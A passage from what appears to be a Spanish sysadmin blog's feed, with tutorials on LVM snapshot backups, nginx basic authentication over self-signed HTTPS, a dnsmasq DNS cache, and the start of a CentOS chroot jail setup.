&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; &amp;gt; /data/a
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y verificamos que el &lt;em&gt;snapshot point-in-time&lt;/em&gt; se quedó en el momento temporal en el que lo hicimos, quedando como estaba entonces:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# grep . /data/* /mnt/*
/data/a:2
/data/b:1
/mnt/a:1
/mnt/b:1
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Verificando los &lt;em&gt;logical volume&lt;/em&gt; con el comando &lt;em&gt;lvs&lt;/em&gt;, vemos que es un volumen de 100 MB, con una ocupación baja, del 0,08%. El &lt;em&gt;snapshot&lt;/em&gt; quedaría inservible si llegara a superar el 100%.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvs
  LV         VG   Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  datos      lvm  owi-aos---   &lt;span class="m"&gt;1&lt;/span&gt;,00g
  datos-snap lvm  swi-aos--- &lt;span class="m"&gt;100&lt;/span&gt;,00m      datos  &lt;span class="m"&gt;0&lt;/span&gt;,08
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Sacando el backup&lt;/h2&gt;
&lt;p&gt;El objetivo inicial era sacar una copia de los datos, congelados en un momento concreto. Tenemos ese momento en el volumen &lt;em&gt;datos-snap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Empezaremos montándolo en alguna carpeta cualquiera, si no lo teníamos ya (lo hemos montado en el punto anterior).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /dev/lvm/datos-snap /mnt/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con el volumen montado, el resto es procedimiento estándar. En este caso, vamos a sacar un fichero &lt;em&gt;.tar.gz&lt;/em&gt; con el contenido de la carpeta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /mnt/
root@server:/mnt# tar cvzf /root/backup.tar.gz *
a
b
root@server:/mnt#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente vamos a limpiar el &lt;em&gt;snapshot&lt;/em&gt;, empezando por desmontar el volumen. Como estamos dentro de la carpeta no vamos a poder desmontar el volumen, así que salimos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:/mnt# &lt;span class="nb"&gt;cd&lt;/span&gt;
root@server:~# umount /mnt/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora que no lo tenemos montado, lo eliminamos sin problemas con las herramientas propias de &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvremove /dev/lvm/datos-snap
Do you really want to remove active logical volume datos-snap? &lt;span class="o"&gt;[&lt;/span&gt;y/n&lt;span class="o"&gt;]&lt;/span&gt;: y
  Logical volume &lt;span class="s2"&gt;&amp;quot;datos-snap&amp;quot;&lt;/span&gt; successfully removed
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo quedará poner el fichero &lt;em&gt;backup.tar.gz&lt;/em&gt; a buen recaudo.&lt;/p&gt;</content><category term="linux"></category><category term="lvm"></category><category term="logical volume manager"></category><category term="snapshot"></category><category term="point-in-time"></category><category term="backup"></category></entry><entry><title>Restringiendo accesos web mediante autenticación básica</title><link href="http://www.linuxsysadmin.ml/2016/02/restringiendo-accesos-web-mediante-autenticacion-basica.html" rel="alternate"></link><published>2016-02-08T08:30:00+01:00</published><updated>2016-02-08T08:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-02-08:/2016/02/restringiendo-accesos-web-mediante-autenticacion-basica.html</id><summary type="html">&lt;p&gt;Algunas veces nos encontramos con la necesidad de restringir el acceso a algunos recursos web. Normalmente se suele implementar algún sistema de &lt;em&gt;login&lt;/em&gt;, &lt;em&gt;cookies&lt;/em&gt; o &lt;em&gt;sesiones&lt;/em&gt;; no obstante, esta opción no siempre nos es posible, y tenemos que proteger esos recursos usando los mecanismos que nos ofrezca el servidor web …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces nos encontramos con la necesidad de restringir el acceso a algunos recursos web. Normalmente se suele implementar algún sistema de &lt;em&gt;login&lt;/em&gt;, &lt;em&gt;cookies&lt;/em&gt; o &lt;em&gt;sesiones&lt;/em&gt;; no obstante, esta opción no siempre nos es posible, y tenemos que proteger esos recursos usando los mecanismos que nos ofrezca el servidor web.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ATENCIÓN&lt;/strong&gt;: Este método es bastante simple, y se puede descodificar lo que manda el cliente; por eso se recomienda encarecidamente usar &lt;strong&gt;SSL&lt;/strong&gt;, mediante el uso de &lt;strong&gt;HTTPS&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Empezaremos instalando el servidor web y la herramienta de generación de certificados para usar con &lt;strong&gt;SSL&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install nginx-light openssl
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  nginx-common
Paquetes sugeridos:
  fcgiwrap nginx-doc ssl-cert ca-certificates
Se instalarán los siguientes paquetes NUEVOS:
  nginx-common nginx-light openssl
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;3&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;1&lt;/span&gt;.126 kB de archivos.
Se utilizarán &lt;span class="m"&gt;2&lt;/span&gt;.148 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Generar el certificado y la clave de la CA&lt;/h2&gt;
&lt;p&gt;Empezaremos por generar la clave de la CA, que va a servir para firmar el certificado que pondremos en el servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl genrsa -des3 -out ca.key &lt;span class="m"&gt;4096&lt;/span&gt;
Generating RSA private key, &lt;span class="m"&gt;4096&lt;/span&gt; bit long modulus
..................................++
.....................................................................++
e is &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x10001&lt;span class="o"&gt;)&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
Verifying - Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora generamos el certificado de la CA. Lo generamos directamente firmado en un solo paso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl req -new -x509 -days &lt;span class="m"&gt;365&lt;/span&gt; -key ca.key -out ca.crt -subj &lt;span class="s2"&gt;&amp;quot;/C=ES/ST=Spain/L=Barcelona/O=LinuxSysadmin&amp;quot;&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Generar el certificado para el servidor web&lt;/h2&gt;
&lt;p&gt;Generamos la clave para el certificado del servidor web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl genrsa -des3 -out server.key &lt;span class="m"&gt;4096&lt;/span&gt;
Generating RSA private key, &lt;span class="m"&gt;4096&lt;/span&gt; bit long modulus
.....................................................................++
......................................................................................................................................................................++
e is &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x10001&lt;span class="o"&gt;)&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key:
Verifying - Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora creamos un certificado para el servidor web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl req -new -key server.key -out server.csr -subj &lt;span class="s2"&gt;&amp;quot;/C=ES/ST=Spain/L=Barcelona/O=LinuxSysadmin/CN=private.linuxsysadmin.tk&amp;quot;&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo firmamos con la clave y el certificado de la CA.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl x509 -req -days &lt;span class="m"&gt;365&lt;/span&gt; -in server.csr -CA ca.crt -CAkey ca.key -set_serial &lt;span class="m"&gt;01&lt;/span&gt; -out server.crt
Signature ok
&lt;span class="nv"&gt;subject&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/C&lt;span class="o"&gt;=&lt;/span&gt;ES/ST&lt;span class="o"&gt;=&lt;/span&gt;Spain/L&lt;span class="o"&gt;=&lt;/span&gt;Barcelona/O&lt;span class="o"&gt;=&lt;/span&gt;LinuxSysadmin/CN&lt;span class="o"&gt;=&lt;/span&gt;private.linuxsysadmin.tk
Getting CA Private Key
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Si la clave está protegida por una &lt;em&gt;passphrase&lt;/em&gt;, se va a necesitar introducirla cada vez que se quiera levantar el servidor web. Nos lo podemos ahorrar con unos simples comandos, que dejará la clave como insegura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mv server.key server.key.secure
root@server:~# openssl rsa -in server.key.secure -out server.key
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key.secure:
writing RSA key
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Montando el dominio web&lt;/h2&gt;
&lt;p&gt;Para habilitar &lt;strong&gt;SSL&lt;/strong&gt; en un dominio, necesitamos la clave y el certificado del servidor, así que vamos a ponerlos en una carpeta pensado para tal efecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cp server.key /etc/ssl/private/
root@server:~# cp server.crt /etc/ssl/certs/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así quedarían los certificados una vez en su sitio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree /etc/ssl/
/etc/ssl/
├── certs
│   └── server.crt
├── openssl.cnf
└── private
    └── server.key

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;3&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a poner un fichero de configuración en &lt;strong&gt;nginx&lt;/strong&gt;, que va a escuchar por el puerto 443 y con &lt;strong&gt;SSL&lt;/strong&gt; habilitado. Indicamos también donde están los ficheros que servirá el &lt;strong&gt;nginx&lt;/strong&gt;, la localización de los certificados y activamos la autenticación básica.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/nginx/sites-enabled/private.linuxsysadmin.tk
server &lt;span class="o"&gt;{&lt;/span&gt;
        listen &lt;span class="m"&gt;443&lt;/span&gt; ssl&lt;span class="p"&gt;;&lt;/span&gt;
        server_name private.linuxsysadmin.tk&lt;span class="p"&gt;;&lt;/span&gt;
        root /www&lt;span class="p"&gt;;&lt;/span&gt;

        ssl_certificate /etc/ssl/certs/server.crt&lt;span class="p"&gt;;&lt;/span&gt;
        ssl_certificate_key /etc/ssl/private/server.key&lt;span class="p"&gt;;&lt;/span&gt;

        auth_basic &lt;span class="s2"&gt;&amp;quot;Admin Area&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        auth_basic_user_file /etc/nginx/auth/private&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora tenemos que crear un fichero tipo &lt;em&gt;.htpasswd&lt;/em&gt; como los de &lt;strong&gt;apache&lt;/strong&gt;. Crearemos primero la carpeta en donde lo vamos a dejar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /etc/nginx/auth
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En la carpeta creada pondremos un fichero llamado &lt;em&gt;private&lt;/em&gt; con un formato idéntico a los &lt;em&gt;.htpasswd&lt;/em&gt; de &lt;strong&gt;apache&lt;/strong&gt;. Aquí podríamos usar las herramientas de &lt;strong&gt;apache-utils&lt;/strong&gt;, pero de momento nos conformaremos con crearlo con &lt;strong&gt;openssl&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin:&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;openssl passwd -crypt s3cr3t&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/nginx/auth/private
root@server:~# cat /etc/nginx/auth/private
admin:y6xasR0LI8mbg
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente reiniciamos el servidor web para que aplique los cambios en la configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# service nginx restart
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobación de funcionamiento&lt;/h2&gt;
&lt;p&gt;Es importante que nos acordemos de crear nuestro &lt;em&gt;document root&lt;/em&gt; con algún contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /www
root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Private area&amp;quot;&lt;/span&gt; &amp;gt; /www/index.html
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si apuntamos un navegador al dominio configurado, y tras aceptar nuestro certificado autofirmado como excepción, deberíamos ver que se nos piden las credenciales en una ventana emergente.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Autenticación básica: credenciales" src="http://www.linuxsysadmin.ml/images/autenticacion-basica-credenciales.png"&gt;&lt;/p&gt;
&lt;p&gt;Y con eso tenemos nuestro contenido protegido de los curiosos.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="nginx"></category><category term="autenticacion basica"></category><category term="htpasswd"></category><category term="ssl"></category><category term="https"></category><category term="certificado"></category></entry><entry><title>Un proxy DNS con dnsmasq</title><link href="http://www.linuxsysadmin.ml/2016/02/un-proxy-dns-con-dnsmasq.html" rel="alternate"></link><published>2016-02-01T08:30:00+01:00</published><updated>2016-02-01T08:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-02-01:/2016/02/un-proxy-dns-con-dnsmasq.html</id><summary type="html">&lt;p&gt;A veces nos puede interesar disponer de una servidor &lt;strong&gt;DNS&lt;/strong&gt; para nombrar las máquinas de nuestra red privada, sin la complejidad de &lt;strong&gt;BIND&lt;/strong&gt;. Otras, queremos acelerar el acceso a internet desde nuestra red; es interesante ver el tiempo que se pierde en la resolución &lt;strong&gt;DNS&lt;/strong&gt;. Para eso disponemos de &lt;strong&gt;dnsmasq …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces nos puede interesar disponer de una servidor &lt;strong&gt;DNS&lt;/strong&gt; para nombrar las máquinas de nuestra red privada, sin la complejidad de &lt;strong&gt;BIND&lt;/strong&gt;. Otras, queremos acelerar el acceso a internet desde nuestra red; es interesante ver el tiempo que se pierde en la resolución &lt;strong&gt;DNS&lt;/strong&gt;. Para eso disponemos de &lt;strong&gt;dnsmasq&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El servicio &lt;strong&gt;dnsmasq&lt;/strong&gt; proporciona servicios como caché &lt;strong&gt;DNS&lt;/strong&gt; y como servidor &lt;strong&gt;DHCP&lt;/strong&gt;. Se trata de un &lt;em&gt;proxy&lt;/em&gt; &lt;strong&gt;DNS&lt;/strong&gt; que va a dirigir las consultas &lt;strong&gt;DNS&lt;/strong&gt; contra el servidor configurado en el &lt;em&gt;proxy&lt;/em&gt;, guardando una copia en &lt;em&gt;caché&lt;/em&gt; para agilizar futuras consultas.&lt;/p&gt;
&lt;p&gt;Es muy fácil de configurar y es bastante ligero. Se considera ideal para redes pequeñas con menos de 50 ordenadores.&lt;/p&gt;
&lt;p&gt;En mi caso, resultó muy útil para solucionar el problema de &lt;strong&gt;DNS&lt;/strong&gt; que me planteaba una red &lt;strong&gt;Virtualbox&lt;/strong&gt; &lt;em&gt;solo anfitrión&lt;/em&gt;, en donde se escondían mis máquinas virtuales con dirección IP estática. Resulta que me muevo entre varias zonas de trabajo, y que no hay ningún servidor &lt;strong&gt;DNS&lt;/strong&gt; accesible desde todas; ir cambiando los &lt;strong&gt;DNS&lt;/strong&gt; de todas las máquinas era trabajoso.&lt;/p&gt;
&lt;p&gt;Con este problema, puse &lt;strong&gt;dnsmasq&lt;/strong&gt; en mi anfitrión (que usaba &lt;strong&gt;DHCP&lt;/strong&gt; y recibía el &lt;strong&gt;DNS&lt;/strong&gt; automáticamente), y configuré todas las máquinas para que usaran el anfitrión como servidor &lt;strong&gt;DNS&lt;/strong&gt;; nunca mas tuve que configurarlos.&lt;/p&gt;
&lt;h2&gt;Instalación&lt;/h2&gt;
&lt;p&gt;La instalación en una máquina derivada de &lt;em&gt;Debian&lt;/em&gt; es muy simple; está en los repositorios oficiales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@proxy:~# apt-get install dnsmasq
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  dns-root-data dnsmasq-base libnetfilter-conntrack3
Paquetes sugeridos:
  resolvconf
Se instalarán los siguientes paquetes NUEVOS:
  dns-root-data dnsmasq dnsmasq-base libnetfilter-conntrack3
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;4&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;488&lt;/span&gt; kB de archivos.
Se utilizarán &lt;span class="m"&gt;1&lt;/span&gt;.170 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@proxy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de querer modificar la configuración, se debe editar el fichero &lt;em&gt;/etc/dnsmasq.conf&lt;/em&gt;, y luego reiniciar el servicio &lt;em&gt;dnsmasq&lt;/em&gt;. En este mismo fichero se puede configurar el servicio &lt;strong&gt;DHCP&lt;/strong&gt; (directiva &lt;em&gt;dhcp-range&lt;/em&gt;), el servidor de nombres a dar al resto (la misma máquina de &lt;em&gt;dnsmasq&lt;/em&gt;, por defecto), el servidor &lt;strong&gt;NTP&lt;/strong&gt; o el &lt;em&gt;gateway&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En mi caso, no vi necesario activar estos servicios, así que el fichero de configuración no se vio modificada. Así pues, con esto basta.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: En caso de querer resolver localmente, &lt;em&gt;dnsmasq&lt;/em&gt; sirve los nombres alojados en &lt;em&gt;/etc/hosts&lt;/em&gt;, a menos que se indique lo contrario en la configuración. Basta con modificar ese fichero.&lt;/p&gt;
&lt;h2&gt;Comprobación y uso&lt;/h2&gt;
&lt;p&gt;Para comprobar que funciona, vamos a poner otra máquina, configurada para usar el nuevo servidor &lt;strong&gt;DNS&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# cat /etc/resolv.conf 
nameserver &lt;span class="m"&gt;192&lt;/span&gt;.168.56.1
root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En principio basta con comprobar que resuelve el nombre de una petición cualquiera, por ejemplo, con un &lt;strong&gt;ping&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Sin embargo, podemos apreciar la mejora de la &lt;em&gt;caché&lt;/em&gt; mediante una herramienta mas avanzada de resolución &lt;strong&gt;DNS&lt;/strong&gt;, por ejemplo, con &lt;strong&gt;dig&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# dig www.linuxsysadmin.tk &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;Query time&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;118&lt;/span&gt; msec
root@client:~# dig www.linuxsysadmin.tk &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;Query time&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;5&lt;/span&gt; msec
root@client:~# dig www.linuxsysadmin.tk &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;Query time&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;4&lt;/span&gt; msec
root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto hemos cumplido; tenemos un &lt;em&gt;proxy caché&lt;/em&gt; &lt;strong&gt;DNS&lt;/strong&gt;, que nos agiliza las peticiones, nos resuelve localmente y nos evita ir cambiando el &lt;strong&gt;DNS&lt;/strong&gt; cada vez que nos movemos de zona de trabajo.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="dnsmasq"></category><category term="cache"></category><category term="dns"></category><category term="dhcp"></category></entry><entry><title>Creando una jaula CentOS</title><link href="http://www.linuxsysadmin.ml/2016/01/creando-una-jaula-centos.html" rel="alternate"></link><published>2016-01-25T08:00:00+01:00</published><updated>2016-01-25T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-01-25:/2016/01/creando-una-jaula-centos.html</id><summary type="html">&lt;p&gt;Algunas veces nos puede interesar levantar procesos o demonios en entornos controlados, por ejemplo en una jaula, o para crear un contenedor. Otras veces, por comodidad o conocimiento, nos puede interesar cambiar la distribución, por ejemplo, servicios &lt;em&gt;CentOS&lt;/em&gt; en un servidor &lt;em&gt;Ubuntu&lt;/em&gt;. Hoy vamos a construir una jaula con &lt;em&gt;CentOS …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces nos puede interesar levantar procesos o demonios en entornos controlados, por ejemplo en una jaula, o para crear un contenedor. Otras veces, por comodidad o conocimiento, nos puede interesar cambiar la distribución, por ejemplo, servicios &lt;em&gt;CentOS&lt;/em&gt; en un servidor &lt;em&gt;Ubuntu&lt;/em&gt;. Hoy vamos a construir una jaula con &lt;em&gt;CentOS&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a crear una jaula de &lt;em&gt;CentOS&lt;/em&gt;, partiendo de una distribución basada en &lt;strong&gt;yum&lt;/strong&gt;. En este caso, se trata de una distribución &lt;em&gt;RedHat&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# cat /etc/redhat-release&lt;/span&gt;
Red Hat Enterprise Linux Server release &lt;span class="m"&gt;7&lt;/span&gt;.2 &lt;span class="o"&gt;(&lt;/span&gt;Maipo&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación de la jaula&lt;/h2&gt;
&lt;p&gt;Empezaremos declarando una variable para indicar donde vamos a crear la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# export JAIL=/root/jail&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear la carpeta de la jaula y la estructura necesaria para albergar los datos del comando &lt;strong&gt;rpm&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# mkdir -p ${JAIL}/var/lib/rpm&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como la base de datos de &lt;strong&gt;rpm&lt;/strong&gt; no existe, la vamos a recrear con el mismo comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# rpm --rebuilddb --root=${JAIL}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos ahora que tenemos una estructura de carpetas que empieza a parecerse a lo que debería.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# tree $JAIL&lt;/span&gt;
/root/jail
&lt;span class="sb"&gt;`&lt;/span&gt;-- var
    &lt;span class="sb"&gt;`&lt;/span&gt;-- lib
        &lt;span class="sb"&gt;`&lt;/span&gt;-- rpm
            &lt;span class="sb"&gt;`&lt;/span&gt;-- Packages

&lt;span class="m"&gt;3&lt;/span&gt; directories, &lt;span class="m"&gt;1&lt;/span&gt; file
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso consiste en localizar el fichero &lt;em&gt;.rpm&lt;/em&gt; relativo a la &lt;em&gt;release&lt;/em&gt; de &lt;em&gt;CentOS&lt;/em&gt; que queramos en nuestra jaula. Apuntamos el navegador al servidor web con el repositorio base en &lt;a href="http://mirror.centos.org/centos/"&gt;http://mirror.centos.org/centos/&lt;/a&gt; y buscamos el &lt;em&gt;link&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Suponiendo que queramos un &lt;em&gt;CentOS&lt;/em&gt; versión 7 y con una arquitectura &lt;em&gt;x64_64&lt;/em&gt;, el &lt;em&gt;link&lt;/em&gt; podría ser &lt;a href="http://mirror.centos.org/centos/7/os/x86_64/Packages/centos-release-7-2.1511.el7.centos.2.10.x86_64.rpm"&gt;http://mirror.centos.org/centos/7/os/x86_64/Packages/centos-release-7-2.1511.el7.centos.2.10.x86_64.rpm&lt;/a&gt;.&lt;/p&gt;
